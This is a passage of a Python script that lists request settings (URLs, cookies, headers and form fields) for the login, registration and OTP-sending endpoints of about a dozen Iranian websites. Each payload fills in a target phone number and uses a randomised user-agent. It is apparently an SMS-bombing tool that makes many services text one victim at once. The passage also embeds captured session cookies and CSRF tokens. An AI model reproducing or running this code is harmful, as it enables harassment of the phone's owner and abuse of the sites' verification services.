    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=abecc6d4-b94a-0738-40ff-37bf450314cb; analytics_session_token=54b5311a-adc9-f9cb-fd5a-ea84ed57b91e; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga=GA1.2.1453660068.1693729659; _gid=GA1.2.1339218606.1693729659; _gat_gtag_UA_136391750_1=1; _ga_KM5G9YGP4G=GS1.1.1693729659.1.0.1693729663.56.0.0; XSRF-TOKEN=eyJpdiI6IldGYjB1WGx2aHdOTEJ6WTUzR3BqZEE9PSIsInZhbHVlIjoiSDNid1ZQV2lhL1NZU1dqaVpaVGx4MWVaS2s1cG5jQTBtUmFhYk5ndUZUeWpTZUVqMkpiZExCaFNId2U1UTJjUU9xWEhIYlhoZFRQWU1MK1FXNkZYVUpoL3R5TXd6U3p2dGNXTmpia0Urb29RajJ5YnZpQ1IyVmdTYzRoQmtybDAiLCJtYWMiOiI1NjBhYzRkOTQ4Y2IyMDNmZmMzOWFiMjY1OTNiOTAxZTQxYjhhYWJkNjk5Mjg1NTc5MGEzZmZhOWMxOGQ0MzZjIiwidGFnIjoiIn0%3D; se_entekhabcenterapptwo_cxv=eyJpdiI6IjMvS1BXaHMzRlpCVWlPNDEySGZGQ1E9PSIsInZhbHVlIjoia0p3bnkwQXMrOENBaFYwbi9sWTZGdWpzUFRkM2ppNEJCaUNDeWZBUHdqTEJmenVYN050cjJJYTl5YjlnYmxqK1J1TkIzemtMZ3paYmE4ZktXZlJxTWNySmVnd1ExZGNqc3FuQm50My9LbnVHblVEd1hnaDV4dDh2UDZsckFDWTQiLCJtYWMiOiJiYzI1MzM0MTM3NzM1ZTQ5NzBmNGVlMTA3ZGNmOTFkNjdmY2RkMDVjYzQ2MjU0ODEyNDIwNTc0ZDI0OGFmZjYzIiwidGFnIjoiIn0%3D',
    'origin': 'https://www.entekhabcenter.com',
    'referer': 'https://www.entekhabcenter.com/auth',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

data73 = {
    '_token': '3Sn1V3v094smEOKTDxK4tA1P2n9NbDBeBqREytvL',
    'auth': num,
}


url74 = "https://brandiol.com/wp-admin/admin-ajax.php"
cookies74 = {
    '_lscache_vary': '1b4accd362f639d005868c6a17f7db1c',
    '_ga_571E5WCRY0': 'GS1.1.1693729914.1.0.1693729914.0.0.0',
    '_ga': 'GA1.2.1545496169.1693729914',
    '_gid': 'GA1.2.606366379.1693729914',
    '_gat_gtag_UA_52550378_2': '1',
    'digits_countrycode': '98',
    'PHPSESSID': '684254078dce5396678b4e0dd4ffe591',
}

headers74 = {
    'authority': 'brandiol.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_lscache_vary=1b4accd362f639d005868c6a17f7db1c; _ga_571E5WCRY0=GS1.1.1693729914.1.0.1693729914.0.0.0; _ga=GA1.2.1545496169.1693729914; _gid=GA1.2.606366379.1693729914; _gat_gtag_UA_52550378_2=1; digits_countrycode=98; PHPSESSID=684254078dce5396678b4e0dd4ffe591',
    'origin': 'https://brandiol.com',
    'referer': 'https://brandiol.com/my-account/?login=true&back=home&page=1',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data74 = {
    'action': 'digits_check_mob',
    'countrycode': '+98',
    'mobileNo': num,
    'csrf': 'ea8c277693',
    'login': '2',
    'username': '',
    'email': '',
    'captcha': '',
    'captcha_ses': '',
    'digits': '1',
    'json': '1',
    'whatsapp': '0',
    'digits_reg_name': 'aa',
    'digregcode': '+98',
    'digits_reg_mail': num,
    'digits_reg_password': '12345678tre',
    'dig_otp': '',
    'code': '',
    'dig_reg_mail': '',
    'dig_nounce': 'ea8c277693',
}

url75 = "https://mosbatesabz.com/wp-admin/admin-ajax.php"
cookies75 = {
    'd_user_session': '9e0fef3a12c064365181fe745e19b811c642c30868f374883f06332965d7a94abe18f9d30a3b44dd06ae312062ea3172b19c8f74be11b829b312b7a8ce831027',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'dbb59245-2ce2-70cf-7a03-6cf8e8f8893c',
    'analytics_session_token': 'f9b2986e-0c71-262f-cfb7-0c2cbcdf9f8e',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_gcl_au': '1.1.1863909273.1693730284',
    'PHPSESSID': 'b687d189ad0c18a0a70ddbafc624ef0e',
}

headers75 = {
    'authority': 'mosbatesabz.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'd_user_session=9e0fef3a12c064365181fe745e19b811c642c30868f374883f06332965d7a94abe18f9d30a3b44dd06ae312062ea3172b19c8f74be11b829b312b7a8ce831027; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=dbb59245-2ce2-70cf-7a03-6cf8e8f8893c; analytics_session_token=f9b2986e-0c71-262f-cfb7-0c2cbcdf9f8e; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _gcl_au=1.1.1863909273.1693730284; PHPSESSID=b687d189ad0c18a0a70ddbafc624ef0e',
    'origin': 'https://mosbatesabz.com',
    'referer': 'https://mosbatesabz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fmosbatesabz.com%2F',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data75 = {
    'login_digt_countrycode': '+98',
    'digits_phone': num0,
    'action_type': 'phone',
    'digits_process_register': '1',
    'sms_otp': '',
    'digits_otp_field': '1',
    'digits': '1',
    'instance_id': '4e150b6baac9b8bda49484928dff2845',
    'action': 'digits_forms_ajax',
    'type': 'login',
    'digits_step_1_type': '',
    'digits_step_1_value': '',
    'digits_step_2_type': '',
    'digits_step_2_value': '',
    'digits_step_3_type': '',
    'digits_step_3_value': '',
    'digits_login_email_token': '',
    'digits_redirect_page': '-1',
    'digits_form': '60fea81aa4',
    '_wp_http_referer': '/?login=true&page=1&redirect_to=https%3A%2F%2Fmosbatesabz.com%2F',
    'show_force_title': '1',
    'container': 'digits_protected',
    'sub_action': 'sms_otp',
}


url76 = "https://hyperbaz.com/module/appsys3/smartlogin"
cookies76 = {
    'PrestaShop-aefcd009954c61a2e6692a93bc7d2807': 'a1ff3a04ef3678c29b3e9ea8347ab51db39b0664ac8dfabb1759a46194a65260%3AKEtSV1PAX751I8EKW4SIuKfiAjmKCKPzgJk195JUfNwtl58LApv1322XYgSWg1n2Ku1wVAZ2TZWnsPgFTiApXf8eosaBV6TFHhxQc3XTTJs%3D',
    'PHPSESSID': 'ku2vtfugj5fnlt8kf8rkn3o427',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '97c92259-fdb8-d2d9-234e-14685105b015',
    'analytics_session_token': '01f3c365-f4a2-8cba-a9c6-4454e17f22b5',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_ga': 'GA1.2.407748180.1693730514',
    '_gid': 'GA1.2.1980522310.1693730514',
    '_gat': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    'crisp-client%2Fsession%2Fc5b57628-0a4d-47b5-9f85-67b8efae3e8d': 'session_9670cb6d-4369-4431-a429-52a34905e5a4',
    '_ga_X1RB9LB5JG': 'GS1.2.1693730515.1.1.1693730522.53.0.0',
    'PrestaShop-b75825e74bb3d6ad54d8fea28596cea2': 'c912feca69862bfa8dd366ef18bef8782e59223aed0d7eeebe1faed186dfb7f8%3AKEtSV1PAX751I8EKW4SIuKfiAjmKCKPzgJk195JUfNwverrN3Xg0Zs9sNG00sDnlaP3lFiVaA%2BJcYr8qeTZPZHKaE%2BiV3nB0HlwV2zyzGWpFatES7FBcwz%2Frv6i0FX0KZoMmj3RR1O94SnrpXNnKgohimRZ%2F1Zlja%2F44Mv%2BmvZcTWftjGurSuZ44NEbHGMSuuqe%2BjSDLc8OULpk0rV7rYQ%3D%3D',
}

headers76 = {
    'authority': 'hyperbaz.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PrestaShop-aefcd009954c61a2e6692a93bc7d2807=a1ff3a04ef3678c29b3e9ea8347ab51db39b0664ac8dfabb1759a46194a65260%3AKEtSV1PAX751I8EKW4SIuKfiAjmKCKPzgJk195JUfNwtl58LApv1322XYgSWg1n2Ku1wVAZ2TZWnsPgFTiApXf8eosaBV6TFHhxQc3XTTJs%3D; PHPSESSID=ku2vtfugj5fnlt8kf8rkn3o427; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=97c92259-fdb8-d2d9-234e-14685105b015; analytics_session_token=01f3c365-f4a2-8cba-a9c6-4454e17f22b5; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _ga=GA1.2.407748180.1693730514; _gid=GA1.2.1980522310.1693730514; _gat=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; crisp-client%2Fsession%2Fc5b57628-0a4d-47b5-9f85-67b8efae3e8d=session_9670cb6d-4369-4431-a429-52a34905e5a4; _ga_X1RB9LB5JG=GS1.2.1693730515.1.1.1693730522.53.0.0; PrestaShop-b75825e74bb3d6ad54d8fea28596cea2=c912feca69862bfa8dd366ef18bef8782e59223aed0d7eeebe1faed186dfb7f8%3AKEtSV1PAX751I8EKW4SIuKfiAjmKCKPzgJk195JUfNwverrN3Xg0Zs9sNG00sDnlaP3lFiVaA%2BJcYr8qeTZPZHKaE%2BiV3nB0HlwV2zyzGWpFatES7FBcwz%2Frv6i0FX0KZoMmj3RR1O94SnrpXNnKgohimRZ%2F1Zlja%2F44Mv%2BmvZcTWftjGurSuZ44NEbHGMSuuqe%2BjSDLc8OULpk0rV7rYQ%3D%3D',
    'origin': 'https://hyperbaz.com',
    'referer': 'https://hyperbaz.com/accounts',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data76 = {
    'ajax': 'true',
    'action': 'verify_identity',
    'data': 'identity=' + num,
    'request_uri': 'https://hyperbaz.com/accounts',
}

url77 = "https://account.bama.ir/Account/Login"
cookies77 = {
    '_ga': 'GA1.1.1681539285.1693731563',
    'X-User-Context': '0ec86b0d-e575-432b-8068-6fd4f96499dc',
    'HASH_X-User-Context': 'bdd8af6ad9f9df85e8896162181887f1b838bcde',
    'CSRF-TOKEN-BAMA-STS-COOKIE': 'CfDJ8H2xietMXGZNrG-r2clbFA724qA4rXWs2_bSsAeS5ZVWVh3uHkm_utKKfTb_4t0ZJOoOLWIBHFVpv5t5FpCkkwh3FauYTQ4w75InUTd65I8XuqDaIM4rwbxFU14CMHvbplV3PCsdPJzN9AOcL3v5xII',
    'HASH_CSRF-TOKEN-BAMA-STS-COOKIE': '5f85190e7da9370edb85d1f46e74ec2f9cf2932e',
    '_ga_W7213Q6KZ0': 'GS1.1.1693731562.1.1.1693731575.47.0.0',
}

headers77 = {
    'authority': 'account.bama.ir',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1681539285.1693731563; X-User-Context=0ec86b0d-e575-432b-8068-6fd4f96499dc; HASH_X-User-Context=bdd8af6ad9f9df85e8896162181887f1b838bcde; CSRF-TOKEN-BAMA-STS-COOKIE=CfDJ8H2xietMXGZNrG-r2clbFA724qA4rXWs2_bSsAeS5ZVWVh3uHkm_utKKfTb_4t0ZJOoOLWIBHFVpv5t5FpCkkwh3FauYTQ4w75InUTd65I8XuqDaIM4rwbxFU14CMHvbplV3PCsdPJzN9AOcL3v5xII; HASH_CSRF-TOKEN-BAMA-STS-COOKIE=5f85190e7da9370edb85d1f46e74ec2f9cf2932e; _ga_W7213Q6KZ0=GS1.1.1693731562.1.1.1693731575.47.0.0',
    'origin': 'https://account.bama.ir',
    'referer': 'https://account.bama.ir/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fprotocol%3Doauth2%26response_type%3Dcode%26client_id%3Dpopuplogin%26redirect_uri%3Dhttps%253A%252F%252Fbama.ir%252Fauth%26scope%3Dopenid%2520profile%2520offline_access%2520openid%2520profile%2520email%2520api%2520offline_access%26state%3DuuudgvWzIS%26code_challenge_method%3DS256%26userContext%3D0ec86b0d-e575-432b-8068-6fd4f96499dc%26code_challenge%3DmF3LCxFE2i-aRzfBSm1AIG9ubfwl7_w0Lm1glu4VswQ',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

params77 = {
    'ReturnUrl': '/connect/authorize/callback?protocol=oauth2&response_type=code&client_id=popuplogin&redirect_uri=https%3A%2F%2Fbama.ir%2Fauth&scope=openid%20profile%20offline_access%20openid%20profile%20email%20api%20offline_access&state=uuudgvWzIS&code_challenge_method=S256&userContext=0ec86b0d-e575-432b-8068-6fd4f96499dc&code_challenge=mF3LCxFE2i-aRzfBSm1AIG9ubfwl7_w0Lm1glu4VswQ',
}

data77 = {
    'LoginType': 'person',
    'ReturnUrl': '/connect/authorize/callback?protocol=oauth2&response_type=code&client_id=popuplogin&redirect_uri=https%3A%2F%2Fbama.ir%2Fauth&scope=openid%20profile%20offline_access%20openid%20profile%20email%20api%20offline_access&state=uuudgvWzIS&code_challenge_method=S256&userContext=0ec86b0d-e575-432b-8068-6fd4f96499dc&code_challenge=mF3LCxFE2i-aRzfBSm1AIG9ubfwl7_w0Lm1glu4VswQ',
    'Username': num,
    'Password': '',
    'RememberLogin': 'true',
    'CSRF-TOKEN-BAMA-STS-FORM': 'CfDJ8H2xietMXGZNrG-r2clbFA70dytCc3bikP9jX6hHtJo0wihXGWPFMrZejXB7Ezje3TKBqKOXL7bAN96nOP2_1CT2OUJKScd-7j_ov9JNtAnoju3P7IkMwzFwJmP-DQtUkVz2xt49XiWUROgBzxUiaQM',
}

url78 = "https://www.zanoone.ir/api/customers/login-register"
cookies78 = {
    '_ga': 'GA1.2.628144026.1693731846',
    '_gid': 'GA1.2.903512932.1693731846',
    '_gat_UA-106735589-2': '1',
    '.Nop.Customer': '630a20cd-d2aa-40fd-b5f1-3bed32c3e477',
    '.Nop.Antiforgery': 'CfDJ8I9ujKaXYjhMk6CuBPnjQBxEqNdmNbxOQotzY-R22Mcs13io4G8EWmL91N0zpSB9A0-iBVPGsO8xY80IYgCZhDQQsb2XG3qja0Ql9jyEPXywB6fkK7JM8AgXKOQizRaAnQeBd2VKjQIU6Lh6vihSJEE',
    '_ga_P9WTBKTWSK': 'GS1.2.1693731847.1.1.1693731883.24.0.0',
}

headers78 = {
    'authority': 'www.zanoone.ir',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryW9Ly4mITDJkfAtcS',
    # 'cookie': '_ga=GA1.2.628144026.1693731846; _gid=GA1.2.903512932.1693731846; _gat_UA-106735589-2=1; .Nop.Customer=630a20cd-d2aa-40fd-b5f1-3bed32c3e477; .Nop.Antiforgery=CfDJ8I9ujKaXYjhMk6CuBPnjQBxEqNdmNbxOQotzY-R22Mcs13io4G8EWmL91N0zpSB9A0-iBVPGsO8xY80IYgCZhDQQsb2XG3qja0Ql9jyEPXywB6fkK7JM8AgXKOQizRaAnQeBd2VKjQIU6Lh6vihSJEE; _ga_P9WTBKTWSK=GS1.2.1693731847.1.1.1693731883.24.0.0',
    'origin': 'https://www.zanoone.ir',
    'referer': 'https://www.zanoone.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
}

data78 = f'------WebKitFormBoundaryW9Ly4mITDJkfAtcS\r\nContent-Disposition: form-data; name="step"\r\n\r\n1\r\n------WebKitFormBoundaryW9Ly4mITDJkfAtcS\r\nContent-Disposition: form-data; name="ReturnUrl"\r\n\r\n/\r\n------WebKitFormBoundaryW9Ly4mITDJkfAtcS\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n{num}\r\n------WebKitFormBoundaryW9Ly4mITDJkfAtcS--\r\n'


url79 = "https://api.technosun.ir/v1/auth/request-otp"
cookies79 = {
    'X-Client-Device-ID': '2fc76c20-21ff-40a1-85b0-9fed08fa0f02',
    '_ga': 'GA1.1.1434448380.1693732213',
    '_ga_XR22WLWS5Q': 'GS1.1.1693732212.1.1.1693732238.0.0.0',
}

headers79 = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'X-Client-Device-ID=2fc76c20-21ff-40a1-85b0-9fed08fa0f02; _ga=GA1.1.1434448380.1693732213; _ga_XR22WLWS5Q=GS1.1.1693732212.1.1.1693732238.0.0.0',
    'Origin': 'https://technosun.ir',
    'Referer': 'https://technosun.ir/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': fake.random,
    'X-Client-Name': 'site',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

json_data79 = {
    'call': '0',
    'mobile': num,
    'type': 'register',
}


url80 = "https://www.gerad.ir/account/sendverificationcode"
cookies80 = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'dd140aa0-7074-0106-68a6-c0fcd7c90d17',
    'analytics_session_token': '3bc24451-5593-1d39-4d57-0e05d6df3131',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '__RequestVerificationToken': 'c3SSljta2Ur3PJDxvjvD2jCuGelq7tb7xWxPgG_zEnEYL7zSPXg6x2wiQ62lDMdU9Kn-w5GCZ1lfdcHX12v9W7u69wzamtv_n1oe1pYM3IA1',
    '_ga_C5S4Y43VYX': 'GS1.1.1693732493.1.0.1693732493.0.0.0',
    '_ga': 'GA1.2.1770406756.1693732493',
    '_gid': 'GA1.2.145283205.1693732494',
    '_gat_UA-132551469-2': '1',
}

headers80 = {
    'authority': 'www.gerad.ir',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryWv3Kd9HvwXpUJgXK',
    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=dd140aa0-7074-0106-68a6-c0fcd7c90d17; analytics_session_token=3bc24451-5593-1d39-4d57-0e05d6df3131; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; __RequestVerificationToken=c3SSljta2Ur3PJDxvjvD2jCuGelq7tb7xWxPgG_zEnEYL7zSPXg6x2wiQ62lDMdU9Kn-w5GCZ1lfdcHX12v9W7u69wzamtv_n1oe1pYM3IA1; _ga_C5S4Y43VYX=GS1.1.1693732493.1.0.1693732493.0.0.0; _ga=GA1.2.1770406756.1693732493; _gid=GA1.2.145283205.1693732494; _gat_UA-132551469-2=1',
    'origin': 'https://www.gerad.ir',
    'referer': 'https://www.gerad.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data80 = f'------WebKitFormBoundaryWv3Kd9HvwXpUJgXK\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nqRfE-qU9Mc4UAwt72K4Xf6Q2HtubnZw6klf-avlVqlR3aut2Ivo-Y0ofDd4Kq-EPBCIquMQDOJ8_yYsLbTmsfYC3Q3wgv1-__6mmNYzr_5c1\r\n------WebKitFormBoundaryWv3Kd9HvwXpUJgXK\r\nContent-Disposition: form-data; name="UserId"\r\n\r\na457ea70-8c5c-43c8-a403-594a968b35ed\r\n------WebKitFormBoundaryWv3Kd9HvwXpUJgXK\r\nContent-Disposition: form-data; name="UserName"\r\n\r\n{num}\r\n------WebKitFormBoundaryWv3Kd9HvwXpUJgXK--\r\n'

url81 = "https://mymaral.com/login-register/?type=register&back=https://mymaral.com/"
cookies81 = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '7cc06bbe-4542-6d2f-552d-4c70050a1aa1',
    'analytics_session_token': 'dd65a253-9b73-308e-1573-5bc749843688',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga': 'GA1.2.810047100.1693733515',
    '_gid': 'GA1.2.356901258.1693733515',
    '_gat_gtag_UA_173564823_1': '1',
    'PHPSESSID': '9t4lmn33i8oedmq74m1vd7dkeh',
    '_ga_T2FMDPH3R4': 'GS1.1.1693733515.1.0.1693733517.0.0.0',
}

headers81 = {
    'authority': 'mymaral.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=7cc06bbe-4542-6d2f-552d-4c70050a1aa1; analytics_session_token=dd65a253-9b73-308e-1573-5bc749843688; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga=GA1.2.810047100.1693733515; _gid=GA1.2.356901258.1693733515; _gat_gtag_UA_173564823_1=1; PHPSESSID=9t4lmn33i8oedmq74m1vd7dkeh; _ga_T2FMDPH3R4=GS1.1.1693733515.1.0.1693733517.0.0.0',
    'origin': 'https://mymaral.com',
    'referer': 'https://mymaral.com/login-register/?status=0&back=https://mymaral.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

data81 = {
    'regName': 'اصغر قشنگ',
    'regMobile': num,
    'dlr-register': 'ثبت نام',
}

url82 = "https://abzarreza.com/my-account/"
cookies82 = {
    'alro_alt_provider': '1',
    'zbl_anonymous_id': 'ZBLU2FsdGVkX19jB7HpNkmpyjTdFnDGKKuEU1aQaEf9QNeeXN87XAHTRLtdFIuNhIPQ',
    'zbl_user': 'ZBLU2FsdGVkX18JWthuuDRPT6+pMJxO+rdDJe68ODB6hOy/zEaJX1dSXslj3n/2zrlR0xBgCFlk21qDTGqsUNZo1UQzg+Ai3sfqi7Rr/B3lw0k=',
    '_ga': 'GA1.1.1435726197.1693734139',
    'zbl_cache_integration': 'ZBLU2FsdGVkX1/qb3QZbBqeda85rJ6f7EGM9ANmyMDT8tk=',
    'zbl_cache_insite': 'ZBLU2FsdGVkX1/tI2pyxyXlFvd89TV11qsg76Jnfxq5/FI=',
    'PHPSESSID': '98089e546df0f52af5ee0e5f494935b7',
    'analytics_token': '2c031ccf-d200-49b2-2467-c554ab78db75',
    'analytics_session_token': 'e3c9f58e-3725-97fc-1583-e89abdbac5a2',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_3326077': '0',
    '_hjSession_3326077': 'eyJpZCI6IjkyNDhlZGI3LWQ0N2ItNGNjMi1hODZkLTlkNmQ0OWQ5YzkyMCIsImNyZWF0ZWQiOjE2OTM3MzQxNDMyMzQsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_hjSessionUser_3326077': 'eyJpZCI6IjM5ZjY3NDA3LTE4NzMtNWRhNy1iMDk5LTc0NGQ3MGQ4ZTdmYiIsImNyZWF0ZWQiOjE2OTM3MzQxNDMyMzAsImV4aXN0aW5nIjp0cnVlfQ==',
    '_ga_SYEE0N4KQ0': 'GS1.1.1693734138.1.1.1693734183.15.0.0',
}

headers82 = {
    'authority': 'abzarreza.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'alro_alt_provider=1; zbl_anonymous_id=ZBLU2FsdGVkX19jB7HpNkmpyjTdFnDGKKuEU1aQaEf9QNeeXN87XAHTRLtdFIuNhIPQ; zbl_user=ZBLU2FsdGVkX18JWthuuDRPT6+pMJxO+rdDJe68ODB6hOy/zEaJX1dSXslj3n/2zrlR0xBgCFlk21qDTGqsUNZo1UQzg+Ai3sfqi7Rr/B3lw0k=; _ga=GA1.1.1435726197.1693734139; zbl_cache_integration=ZBLU2FsdGVkX1/qb3QZbBqeda85rJ6f7EGM9ANmyMDT8tk=; zbl_cache_insite=ZBLU2FsdGVkX1/tI2pyxyXlFvd89TV11qsg76Jnfxq5/FI=; PHPSESSID=98089e546df0f52af5ee0e5f494935b7; analytics_token=2c031ccf-d200-49b2-2467-c554ab78db75; analytics_session_token=e3c9f58e-3725-97fc-1583-e89abdbac5a2; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _hjFirstSeen=1; _hjIncludedInSessionSample_3326077=0; _hjSession_3326077=eyJpZCI6IjkyNDhlZGI3LWQ0N2ItNGNjMi1hODZkLTlkNmQ0OWQ5YzkyMCIsImNyZWF0ZWQiOjE2OTM3MzQxNDMyMzQsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _hjSessionUser_3326077=eyJpZCI6IjM5ZjY3NDA3LTE4NzMtNWRhNy1iMDk5LTc0NGQ3MGQ4ZTdmYiIsImNyZWF0ZWQiOjE2OTM3MzQxNDMyMzAsImV4aXN0aW5nIjp0cnVlfQ==; _ga_SYEE0N4KQ0=GS1.1.1693734138.1.1.1693734183.15.0.0',
    'origin': 'https://abzarreza.com',
    'referer': 'https://abzarreza.com/my-account/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

data82 = {
    'alro_user': num,
    'alro_login_register_nonce': '763d212c7a',
    'alro_login_register': '',
    'alro_redirect': '',
}

url83 = "https://www.sarabara.com/wp-admin/admin-ajax.php"
cookies83 = {
    'digits_countrycode': '98',
